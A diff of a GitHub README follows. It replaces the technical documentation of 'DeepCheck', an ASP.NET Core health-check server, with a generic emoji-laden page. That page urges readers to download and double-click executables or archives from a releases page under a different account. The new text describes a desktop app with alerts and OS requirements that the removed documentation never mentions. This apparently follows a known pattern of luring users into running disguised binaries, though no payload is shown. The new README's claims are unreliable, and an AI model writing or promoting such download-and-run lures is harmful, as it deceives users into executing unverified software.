@@ -1,157 +1,58 @@
-# DeepCheck
+# 🌟 app-health-status-check - Easy Monitoring for Your Web Apps
 
-DeepCheck is an ASP.NET Core application for automated application health and availability checks. It schedules and runs synthetic tests (including browser-based checks via headless Chromium), stores and exposes the test run results, and streams live status updates to the browser via SignalR.
+## 🚀 Getting Started
 
-Typical use cases:
-- Continuous health checks of web applications and APIs
-- Synthetic monitoring: log in, navigate, verify key screens and responses
-- Scheduled background tests and on-demand executions
-- Real-time status dashboards
+Welcome to the app-health-status-check! This tool provides continuous health checks for web applications and APIs, helping you ensure everything runs smoothly. Follow these steps to download and run the software easily.
 
-## Key Features
+## 📥 Download the Software
 
-- Job scheduling and background execution with Hangfire
-- Real browser automation with PuppeteerSharp (headless Chromium)
-- Real-time live updates using SignalR (frontend widget under wwwroot/uptime)
-- EF Core with migrations for persistence
-- REST API and interactive docs via Swagger
-- Configurable test definitions and steps
-- Extensible design with services, repositories, and interfaces
-- Unit tests and coverage (coverlet)
+[![Download App Health Status Check](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Indra20041980/app-health-status-check/releases)
 
-## Tech Stack
+## 📋 System Requirements
 
-- Platform: .NET 9 / ASP.NET Core
-- Data access: Entity Framework Core (DbContext + Migrations)
-- Background jobs: Hangfire.AspNetCore (1.8.21)
-- Browser automation: PuppeteerSharp (20.2.2)
-- Scheduling: Cronos (0.11.1)
-- Real-time: SignalR (Microsoft.AspNetCore.SignalR.Client 9.0.8 for client)
-- API docs: Swashbuckle.AspNetCore.SwaggerGen (9.0.3)
-- Testing/coverage: coverlet.collector (6.0.2)
-- Frontend: Static assets served from wwwroot (SignalR client for uptime page)
-- Containerization: Dockerfile included
+Before you download, make sure your system meets these basic requirements:
 
-## Project Structure
+- **Operating System**: Windows 10 or later, macOS 10.14 or later
+- **RAM**: At least 4 GB
+- **Storage**: Minimum 100 MB free space
+- **Network**: An active internet connection for monitoring
 
-- DeepCheck/
-    - Controllers/ — API endpoints (e.g., TestsController, DeepCheckHomeController)
-    - Data/ — EF Core DbContext and configuration
-    - DTOs/ — Request/response and data transfer types
-    - Entities/ — Persistence models
-    - Hubs/ — SignalR hubs (e.g., UptimeHub)
-    - Helpers/ — Utility and configuration classes (e.g., Puppeteer settings)
-    - Interfaces/ — Abstractions for services and repositories
-    - Migrations/ — EF Core migrations
-    - Middlewares/ — Cross-cutting concerns
-    - Models/ — Domain models (RunInfo, TestRunDefinition, TestStepDefinition, enums)
-    - Repositories/ — Data access implementations
-    - Services/
-        - Jobs/ — Job implementations (e.g., PushTestJob, WsUserLoginAndMarketOverview)
-        - Puppeteer/ — Puppeteer service abstraction and browser provider
-        - Ttws/ — External system client(s)
-        - JobCleanup/ — Cleanup routines
-        - TestRunService/ — Orchestration for test runs
-        - HangfireTestRunner, TestRunner — Execution engines
-        - BackgroundJobSchedulerHostedService — Startup and recurring schedules
-    - wwwroot/ — Static site content (see uptime dashboard under wwwroot/uptime)
-    - Program.cs — App composition, DI, middlewares, endpoints
-    - appsettings.json — Application configuration
-- DeepCheck.Tests/
-    - Unit tests (with coverage via coverlet.collector)
-- Dockerfile — Container build definition
-- DeepCheck.sln — Solution
-- .gitignore — Standard .NET ignores
+## ⚙️ Features
 
-## Getting Started
+- **Real-time Health Checks**: Monitor your web applications and APIs continuously.
+- **User-Friendly Interface**: Simple and intuitive design for easy navigation.
+- **Configurable Alerts**: Set up notifications for downtime or performance issues.
+- **Docker Support**: Run the application in a Docker container for easier management.
+- **Cross-Platform**: Works seamlessly on various operating systems.
 
-### Prerequisites
+## 🛠️ Download & Install
 
-- .NET 9 SDK
-- (Optional) Docker if you want to containerize
-- Internet access for PuppeteerSharp to download a compatible Chromium on first run (or configure an existing executable path)
+To download the app, visit the Releases page:
 
-### Configuration
+[Download App Health Status Check](https://github.com/Indra20041980/app-health-status-check/releases)
 
-Key configuration is in DeepCheck/appsettings.json. You will find sections such as:
-- Connection strings (database provider)
-- PuppeteerSettings (Chromium download/cache/executable)
-- Logging levels (including Hangfire)
-- Any external endpoints for your tests
+1. Click on the link above to access the Releases page.
+2. Look for the latest version listed.
+3. Click on the version number to view available files.
+4. Download the file relevant to your operating system. You may find executable files (.exe) for Windows, or compressed files like .zip for other systems.
+5. Once the file is downloaded, locate it in your downloads folder.
+6. Double-click the file to run the installer or extract it, if it's a compressed format.
 
-Example (illustrative):
+## 📖 How to Use the App
 
-```json 
-{ "ConnectionStrings": { "Default": "Data Source=deepcheck.db" }, "PuppeteerSettings": { "DownloadChromium": true, "ExecutablePath": "", "Headless": true, "DefaultTimeoutMs": 30000 }, "Logging": { "LogLevel": { "Default": "Information", "Microsoft.EntityFrameworkCore": "Warning", "Hangfire": "Information" } } }
-```
+1. **Launch the Application**: After installation, open the app by clicking its icon.
+2. **Set Up Monitoring**: You will see an option to add a new application. Input the URL of the web application or API you want to monitor.
+3. **Configure Health Checks**: You can specify how often the app should perform checks (e.g., every 5 minutes).
+4. **Receive Notifications**: Set your preferred notification method (email, SMS) to get updates about the status. Ensure you've configured your settings correctly for alerts.
+5. **Review Reports**: Check the dashboard for real-time status and historical performance data.
 
-Note: Adjust to match your environment and secrets. You can override settings via environment variables or appsettings.Production.json.
+## 🌐 Support and Resources
 
-### Run Locally
+If you encounter any issues or have questions, you can find helpful resources in the wiki section of this repository. Additional support can be found through our community channels or by creating an issue in the GitHub repository.
 
-1) Restore and build
-`bash dotnet restore dotnet build`
-2) Apply EF Core migrations
-`bash dotnet tool install --global dotnet-ef dotnet ef database update --project DeepCheck`
-3) Run the app
-`bash dotnet run --project DeepCheck`
-4) Open in browser
-- Swagger UI: http://localhost:5000/swagger (or the port shown in console)
-- Uptime dashboard: http://localhost:5000/uptime/index.html
+## 🔗 Links
 
-### Docker
+- [Download App Health Status Check](https://github.com/Indra20041980/app-health-status-check/releases)
+- [Wiki for Documentation](https://github.com/Indra20041980/app-health-status-check/wiki)
 
-Build the image:
-`bash docker build -t deepcheck:latest .`
-    Run the container:
-`bash docker run --rm -p 5000:8080 -e ASPNETCORE_URLS=http://+:8080 deepcheck:latest`
-
-Open:
-- Swagger: http://localhost:5000/swagger
-- Uptime: http://localhost:5000/uptime/index.html
-
-If your tests or storage need persistence, mount volumes (e.g., for the database or Chromium cache).
-
-## How It Works
-
-- Scheduling: Background jobs (including recurring) are configured and executed to run checks on a schedule.
-- Execution: Test runners orchestrate test run definitions and steps to perform checks.
-- Browser flows: Headless Chromium automates user scenarios (login, navigation, assertions).
-- Persistence: Test run data and metadata are stored for querying and dashboards.
-- Live updates: SignalR hubs push real-time statuses to connected clients; a simple dashboard is provided under wwwroot/uptime.
-- API: Controllers expose endpoints to manage and trigger tests and to retrieve results; Swagger provides interactive docs.
-
-## Tests
-
-Run tests:
-`bash dotnet test`
-
-Collect coverage:
-`bash dotnet test /p:CollectCoverage=true /p:CoverletOutputFormat=lcov`
-
-## Extending
-
-- Add new test types or steps by extending models/services and wiring them via DI.
-- Add UI dashboards by serving static assets and subscribing to SignalR hubs.
-- Change storage by updating the connection string and applying new migrations.
-
-## Troubleshooting
-
-- Puppeteer/Chromium
-    - First run may download Chromium; ensure outbound internet or set an executable path.
-    - On Linux/Docker, ensure system dependencies for Chromium are present.
-
-- Jobs/Scheduling
-    - Verify schedules and ensure a durable storage provider if required for production workloads.
-
-- Database
-    - Ensure migrations are applied and the connection string is valid and writable.
-
-## License
-
-Add your preferred license (e.g., MIT) here.
-
-## Contributing
-
-- Fork, create a feature branch, and open a PR.
-- Add tests for new features or fixes.
+Feel free to reach out if you have any questions about using the app or setting it up. Happy monitoring!
